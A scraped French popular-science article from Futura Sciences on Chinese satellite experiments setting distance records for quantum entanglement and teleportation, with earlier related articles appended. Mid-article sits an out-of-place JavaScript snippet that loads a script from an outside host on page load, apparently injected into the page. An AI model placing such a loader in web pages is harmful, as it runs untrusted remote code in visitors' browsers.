{"title": "La teleportation quantique bat un nouveau record de distance : 1.400 km !", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-07-13", "content": "L'exploit n'a rien a voir avec  Star Trek  mais reste impressionnant. Apres avoir battu le record de distance avec un effet EPR via des paires de photons intriques transmises par un satellite, des physiciens chinois viennent de battre celui de la distance de teleportation, atteignant 1.400 km. Ce qu'il faut retenir Le phenomene d'intrication quantique pourrait deboucher sur de multiples revolutions technologiques, notamment un Internet quantique securise par cryptographie basee sur la teleportation quantique. Mais qui dit Internet quantique dit persistance de l'intrication quantique avec des particules sur de grandes distances. Un test avec des paires de photons intriques emis depuis l'espace vers le sol a battu un record en montrant, dans un premier temps, que l'intrication subsistait sur une distance de 1.200 km, et, dans une seconde experience, qu'il permettait une teleportation jusqu'a 1.400 km. Interview : intrication et teleportation quantique                       Debusquee dans les equations et les principes de la physique quantique par Einstein et Schrodinger, l'intrication quantique permet de teleporter de l'information entre deux particules. Ce transfert qui semble instantane, fleurtant avec la science fiction, est tres intriguant. Mais il a ete constate en laboratoire. Pourrait-on imaginer la possibilite d'une teleportation humaine ? Dans le cadre de sa serie de videos Questions d'experts, sur la physique et l'astrophysique, l'editeur De Boeck a interroge Olivier Pujol, maitre de conference a l'Universite de Lille, sur cette possibilite.                                       Il y a un mois, une equipe de chercheurs chinois avait battu le record de distance pour la transmission de  photons  << intriques >> avec l'experience Quess ( Quantum Experiments at Space Scale , Experiences quantiques a l'echelle spatiale). L'un de ses aspects les plus spectaculaires est d'avoir ete realisee avec un satellite. Sur son orbite  heliosynchrone , il passe au-dessus du meme point de la surface terrestre a la meme heure solaire locale. Cette  orbite  est utilisee par les  satellites meteorologiques , de reconnaissance et de teledetection. Dans le cas present, le satellite Mozi, nomme en honneur d'un celebre philosophe chinois, avait permis de montrer qu'un effet EPR etait toujours present quand bien meme les photons intriques etaient repartis entre deux villes distantes d'environ 1.200 km, en l'occurrence Delingha et Lijiang.  Cette performance ouvrait la voie a des experiences de teleportations quantiques, prevues a l'origine dans le cadre de Quess mais qui n'avaient pas encore ete realisees. Rappelons toutefois qu'il ne s'agissait nullement d'une teleportation au sens de la science-fiction et a la  Star Trek . Un dispositif illustrant le principe de la production de paires de photons intriques. Un laser (bleu) passe a travers un cristal ou un phenomene d'optique non lineaire produit deux faisceaux (en rouge) avec des paires de photons en sortie. L'etat quantique de ces paires est inscrit sur un tableau noir. (c) IQOQI Vienna,  Austrian Academy of Sciences                               Une preuve de principe pour la teleportation intercontinentale Seules des informations sous forme d'etats quantiques peuvent etre transmises et ces memes informations ne sont utilisables que completees par d'autres, transmises, elle, a la  vitesse de la lumiere  tout au plus. Hors de question, par consequent, de se servir de la teleportation quantique pour se retrouver instantanement sur une  exoplanete  de la  Voie lactee  ni meme de communiquer plus vite que la lumiere.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Un article depose sur  arXiv  par les physiciens chinois montre cependant que des experiences de teleportation quantique ont finalement ete menees avec succes, battant un record et realisant une grande premiere. Personne avant eux n'avait en effet realise une teleportation quantique du sol depuis l'espace. Enfin, les etats quantiques ont ete teleportes entre des paires de photons distantes de 500 a 1.400 km, selon la position de Menzi par rapport a la source de photons au sol, installee a Ngari, au Tibet. Pendant 32 jours, cette source a produit des millions de paires de photons intriques, a un rythme de 4.000 par seconde. Seules environ 900 d'entre elles, cependant, ont participe a la teleportation. Il reste encore du pain sur la planche mais, en principe, rien ne semble s'opposer a un reseau quantique de transfert d'informations qui serait intercontinental, inviolable et realise grace a des satellites en orbite. Pour en savoir plus Vers la teleportation quantique : intrication record de photons a 1.200 km Article de  Laurent Sacco  publie le 19/06/2017 Le precedent record de distance pour une experience faisant intervenir des photons intriques etait detenu dans le cadre d'un essai de teleportation quantique. A present, une equipe de chercheurs chinois, qui s'est pour le moment limitee a tester la persistance de l' intrication quantique , vient de battre ce record avec des paires de photons envoyes depuis l'espace et detectes dans deux villes distantes de 1.200 km. La guerre fait  rage  sur le front de bataille pour la maitrise des technologies quantiques de l'information. L'issue est incertaine pour les  ordinateurs quantiques , meme si certains laboratoires, comme celui d' IBM , espere etablir la suprematie quantique de certains calculateurs ou simulateurs pour des problemes actuellement du ressort des  superordinateurs  classiques. Les perspectives sont bien meilleures pour un futur  Internet  quantique qui permettra des transferts d'informations particulierement fiables par  cryptographie , voire de la teleportation quantique d'etats -- a ne pas confondre avec la mythique teleportation d'objets  physiques  a la Star Trek. Dans tous les cas, c'est le mysterieux phenomene d'intrication quantique qui est mis en oeuvre par les physiciens dans leurs experiences et leurs realisations technologiques. Decouvert theoriquement dans les annees 1930 par Schrodinger,  Einstein  et ses collaborateurs, il est devenu celebre dans le grand public via le fameux  paradoxe EPR  ou encore celui du  chat de Schrodinger . Voir aussi : Un chat de Schrodinger a la fois mort et vivant dans deux boites Grace a ce phenomene, deux photons intriques se comportent comme un seul objet sur des distances que l'on pense arbitrairement grandes. La mesure de certaines caracteristiques de l'un de ses photons provoque alors une modification de l'etat du second a une vitesse inconnue mais certainement bien plus rapide que celle de la lumiere. Il n'est cependant pas possible de s'en servir pour telephoner plus vite que la lumiere. L'Internet du futur sera quantique et spatial Si l'intrication quantique est a priori un bon moyen pour faire de la  cryptographie quantique  ou de la teleportation d'informations avec des photons, il faut s'assurer qu'en pratique, elle peut bien servir a etablir une sorte d'Internet quantique. Or, les photons qui voyagent par exemple dans des fibres optiques peuvent subir des degradations qui rendent impossibles la teleportation ou la  cryptographie  a longue distance. Il y a toujours du bruit. Ce probleme est patent a travers l' air  mais il est censement moins grave si les photons voyagent dans le vide, dans l'espace, donc. D'ou l'idee de realiser des experiences avec des paires de photons intriques qui seraient emis entre des satellites et des stations au sol. Une presentation des bases d'une future experience de distribution quantique de cle a partir d'un satellite qui a permis de battre le record de distance avec l'intrication quantique. Pour obtenir une traduction en francais assez fidele, cliquez sur le rectangle blanc en bas a droite. Les sous-titres en anglais devraient alors apparaitre. Cliquez ensuite sur l'ecrou a droite du rectangle, puis sur << Sous-titres >> et enfin sur << Traduire automatiquement >>. Choisissez << Francais >>. (c)  Science Magazine Comme le montre un article publie dans  Science  par une equipe de chercheurs chinois, il est bel et bien possible de transmettre des paires de photons intriques sur de grandes distances depuis l'espace. Bien que leurs trajectoires soient plus grandes, les physiciens ont montre que certains des photons impliques dans l'experience Quess ( Quantum Experiments at Space Scale , Experiences quantiques a l'echelle spatiale) restaient intriques quand ils etaient detectes sur  Terre  dans deux villes chinoises distantes d'environ 1.200 km, Delingha et Lijiang. En theorie, cela ouvre la  porte  a des experiences de teleportations quantiques comme celles effectuees en 2012 par Anton Zeilinger et ses collegues. Ils etaient parvenus a teleporter des etats quantiques entre Tenerife et La Palma, soit sur une distance de 143 km (voir article plus bas). D'ailleurs, il s'agissait aussi du record de distance pour des experiences cherchant a tester la persistance d'une intrication quantique entre deux systemes physiques. Vers des connexions intercontinentales entre ordinateurs quantiques Bien que la teleportation soit au programme de Quess, les chercheurs chinois n'en sont pas encore la. Pour le moment, ils ont cree des paires de photons intriques dans l' infrarouge  a partir d'une source  laser  dans l' ultraviolet  alimentant un dispositif d'optique non lineaire a bord du satellite Mozi, nomme en honneur d'un celebre philosophe chinois. \" Je suis personnellement convaincu que l'Internet du futur sera base sur ces principes quantiques. Environ 6 millions de photons ont ainsi ete crees et environ 1.000 ont ete detectes sur Terre, ce qui represente un taux de reussite bien superieur a celui obtenu dans les experiences avec des  fibres optiques . Toutefois, ce taux reste pour le moment inferieur a celui exige pour vraiment mettre en oeuvre un reseau de communications quantiques. Les photons sont recus sur la Terre en utilisant des  telescopes  de 1,2 a 1,8 m de diametre et c'est en mesurant leurs polarisations qu'a pu etre etablie la persistance de l'intrication quantique via le fameux test des inegalites de Bell. Voir aussi : Intrication quantique : un test plus solide de l'effet EPR Selon Anton Zeilinger, qui pousse l'Europe dans une direction similaire, la Chine s'engage ainsi dans une direction prometteuse qui, a terme, pourraient ouvrir la voie a des connexions intercontinentales entre ordinateurs quantiques.  << Je suis personnellement convaincu que l'Internet du futur sera base sur ces  principes quantiques  >>  affirme meme le laureat du prix Wolf, souvent l'antichambre d'un prix Nobel. Record de distance battu pour la teleportation quantique : 143 km  Article de Laurent Sacco publie le 25/05/2012 Le record du monde de distance pour de la teleportation quantique a ete battu deux fois en l'espace de quelques semaines. Une equipe chinoise a d'abord atteint 97 km. Mais on vient d'apprendre qu'Anton Zeilinger et ses collegues sont parvenus a teleporter des etats quantiques entre Tenerife et La Palma, soit sur une distance de 143 km. La teleportation quantique, mais pas d'objets, avec des satellites serait a portee de mains. C'est en 1993 que Charles Bennett et ses collegues travaillant chez  IBM  ont publie un article dans lequel ils proposaient un  protocole  experimental devant permettre la teleportation d'etats quantiques. Quatre ans plus tard,  Anton Zeilinger  publiait dans Nature un article annoncant qu'en compagnie d'autres chercheurs, il etait parvenu a mettre en  application  les idees de Bennett pour faire de la  teleportation quantique . La performance est fascinante et elle a tout de suite dechaine l'enthousiasme des fans de la serie Star Trek, y voyant la l'espoir de rendre reel l'un des plus grands reves de la science-fiction. Malheureusement, il y a peu de chance de voir un jour les equivalents de monsieur Spock et du capitaine Kirk disparaissant de la surface de  Pandora  ou d'une  superterre  pour reapparaitre par teleportation a l'interieur de l''Enterprise. On peut meme affirmer que c'est impossible, en tout cas par teleportation quantique. La raison en est que seul un etat quantique est teleporte, de l'information donc, pas de la  matiere . En outre, le systeme physique initial portant l'information est detruit. Dans le meilleur des cas, un  clone  complet, memoire et etat de conscience compris, d'un des personnages de Star Trek pourrait eventuellement etre reconstruit a bord de l'Entreprise mais l'original serait bel et bien mort. La teleportation quantique en elle-meme repose sur le phenomene d'intrication quantique decouvert theoriquement par Einstein et  Schrodinger  dans les annees 1930. C'est ce phenomene qui est au coeur du celebre paradoxe  EPR  et dont l'existence a ete verifiee en 1982 par  Alain Aspect  et ses collegues. Le physicien Anton Zeilinger. (c) Jaqueline Godany                               Vers un reseau de communication par teleportation quantique Comme la technologie de la teleportation quantique pourrait au moins servir a faire un reseau sur de communication avec  cryptographie , on comprend pourquoi plusieurs laboratoires dans le monde cherchent a teleporter des etats quantiques sur des distances de plus en plus grandes. Recemment, on apprenait qu'une equipe chinoise avait battu le record de distance pour la teleportation quantique avec 97 km. Les details de la performance des chercheurs de l'universite de Shangai se trouvent dans un article publie sur  arxiv . Mais voila que l'on apprend, aussi par l'intermediaire d'un article depose sur  arxiv , qu'Anton Zeilinger et ses collegues ont deja pulverise ce record en faisant de la teleportation quantique sur une distance de 143 km. Il y a deja presque un an, les physiciens tentaient d'utiliser des photons pour realiser une teleportation quantique entre deux iles des Canaries bien connues, La Palma et Tenerife, mais le mauvais temps les en avait empeche. La seconde tentative a finalement ete la bonne ! Bien que des satellites de communication se trouvent a des distances plus grandes dans l'espace, l'epaisseur d' atmosphere  a traverser, et donc des effets  parasites  qui seraient dus a la poussiere ou la pluie, sont bien moindres. On serait donc bien au seuil de l'etablissement de veritables telecommunications quantiques sur de grandes distances. ", "theme": "sciences"}